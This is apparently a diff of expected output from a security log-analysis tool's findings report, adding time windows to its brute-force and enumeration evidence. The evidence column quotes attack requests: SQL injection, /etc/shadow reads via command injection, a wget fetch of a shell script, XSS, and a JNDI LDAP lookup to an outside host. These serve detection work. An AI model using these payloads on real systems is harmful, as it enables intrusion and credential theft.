@@ -11,7 +11,7 @@ SKIPPED
 
 FINDINGS
   SEVERITY  RULE     NAME                  SURE  WHERE                  SOURCE           EVIDENCE
-  high      SEN-201  brute_force           yes   logs/attack.log:6      203.0.113.9      5 failed logins
+  high      SEN-201  brute_force           yes   logs/attack.log:6      203.0.113.9      5 failed logins in 10m
   high      SEN-101  sql_injection         yes   logs/attack.log:8      198.51.100.23    GET /products?id=1+UNION+SELECT+name,password+FROM+users 200
   high      SEN-101  sql_injection         yes   logs/attack.log:9      198.51.100.23    GET /login?user=admin%27--&pass=x 401
   medium    SEN-104  path_traversal        yes   logs/attack.log:10     198.51.100.77    GET /static/../../etc/passwd 404
@@ -21,18 +21,18 @@ FINDINGS
   high      SEN-101  sql_injection         yes   logs/attack.log:13     192.0.2.10       GET /items?id=5%20or%201=1 200
   low       SEN-303  malformed_line        yes   logs/attack.log:14     -                2026-11-02T09:18:00Z not-an-address web GET / 200
   low       SEN-303  malformed_line        yes   logs/attack.log:15     -                this line is not a log entry
-  high      SEN-202  login_after_failures  yes   logs/attack.log:16     203.0.113.9      accepted after 6 failed logins: login accepted user=root
+  high      SEN-202  login_after_failures  yes   logs/attack.log:16     203.0.113.9      accepted after 6 failed logins in 10m: login accepted user=root
   high      SEN-102  command_injection     yes   logs/attack.log:17     198.51.100.140   GET /ping?host=8.8.8.8;cat+/etc/shadow 200
   medium    SEN-105  sensitive_file        yes   logs/attack.log:17     198.51.100.140   GET /ping?host=8.8.8.8;cat+/etc/shadow 200
   high      SEN-102  command_injection     yes   logs/attack.log:18     198.51.100.140   GET /ping?host=x%7Cwget%20http://203.0.113.200/a.sh 200
   medium    SEN-103  cross_site_scripting  yes   logs/attack.log:19     198.51.100.150   GET /comment?text=%3Cscript%3Ealert(1)%3C/script%3E 200
   medium    SEN-103  cross_site_scripting  yes   logs/attack.log:20     198.51.100.150   GET /profile?name=<img+src=x+onerror=alert(1)> 200
   medium    SEN-106  scanner               yes   logs/attack.log:21     198.51.100.160   GET / 200 "sqlmap/1.8.4#stable"
-  medium    SEN-203  enumeration           yes   logs/attack.log:31     198.51.100.170   10 requests answered 404
-  high      SEN-204  object_enumeration    no    logs/attack.log:40     198.51.100.180   8 different ids of /api/v1/orders/{id}
+  medium    SEN-203  enumeration           yes   logs/attack.log:31     198.51.100.170   10 requests answered 404 in 10m
+  high      SEN-204  object_enumeration    no    logs/attack.log:40     198.51.100.180   8 different ids of /api/v1/orders/{id} in 10m
   high      SEN-205  foreign_object        no    logs/attack.log:43     198.51.100.190   user 42 was answered an object of user 57: GET /api/users/57/profile 200 user=42
-  high      SEN-206  login_from_many       yes   logs/attack.log:50     -                user alice failed to log in from 4 addresses
-  high      SEN-204  object_enumeration    no    logs/attack.log:58     198.51.100.250   8 different ids of /api/docs/{id}/pdf
+  high      SEN-206  login_from_many       yes   logs/attack.log:50     -                user alice failed to log in from 4 addresses in 10m
+  high      SEN-204  object_enumeration    no    logs/attack.log:58     198.51.100.250   8 different ids of /api/docs/{id}/pdf in 10m
   medium    SEN-301  hidden_text           yes   logs/unicode.log:3     198.51.100.90    GET /files/invoice<hidden>gpj.exe 200
   medium    SEN-301  hidden_text           yes   logs/unicode.log:4     198.51.100.90    login accepted user=ad<hidden>min
   medium    SEN-301  hidden_text           yes   logs/unicode.log:5     198.51.100.90    GET /<control>[2Jcleared 400
@@ -42,8 +42,8 @@ FINDINGS
   high      SEN-108  jndi_injection        yes   logs/nginx.log:5       198.51.100.210   GET /search?q=${jndi:ldap://203.0.113.200/a} 200 "curl/8.5.0"
   high      SEN-205  foreign_object        no    logs/nginx.log:6       198.51.100.220   user 42 was answered an object of user 57: GET /api/users/57/cards 200 "python-requests/2.32" user=42
   medium    SEN-106  scanner               yes   logs/nginx.log:9       198.51.100.230   GET / 200 "Nikto/2.5.0"
-  high      SEN-201  brute_force           yes   logs/auth.log:8        203.0.113.77     5 failed logins
-  high      SEN-202  login_after_failures  yes   logs/auth.log:10       203.0.113.77     accepted after 6 failed logins: sshd login accepted user=root
+  high      SEN-201  brute_force           yes   logs/auth.log:8        203.0.113.77     5 failed logins in 10m
+  high      SEN-202  login_after_failures  yes   logs/auth.log:10       203.0.113.77     accepted after 6 failed logins in 10m: sshd login accepted user=root
 
 SOURCES
   PRI  ADDRESS          SCORE  PROPOSAL   FIRST                       LAST                        TACTICS
